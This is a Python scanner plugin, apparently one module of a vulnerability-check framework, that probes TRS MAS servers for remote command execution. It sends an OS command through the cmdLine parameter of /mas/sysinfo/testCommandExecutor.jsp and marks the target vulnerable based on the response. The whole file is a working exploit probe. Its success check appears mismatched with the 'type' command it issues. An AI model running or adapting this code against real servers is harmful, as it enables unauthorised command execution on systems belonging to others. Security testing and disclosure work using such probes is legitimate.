#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '拓尔思 MAS RCE',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomInt(n,m):#返回某个范围中的int
  import random
  return random.randint(n,m)
def run(url,ua):
  # random = randomLowercase(7)
  r1 = randomInt(1000000,2000000)
  r2 = randomInt(1000000,2000000)
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = f'/mas/sysinfo/testCommandExecutor.jsp?cmdLine=type%20{r1}%20+%20{r2}&workDir=&pathEnv=&libPathEnv='
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and str(r1+r2) in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret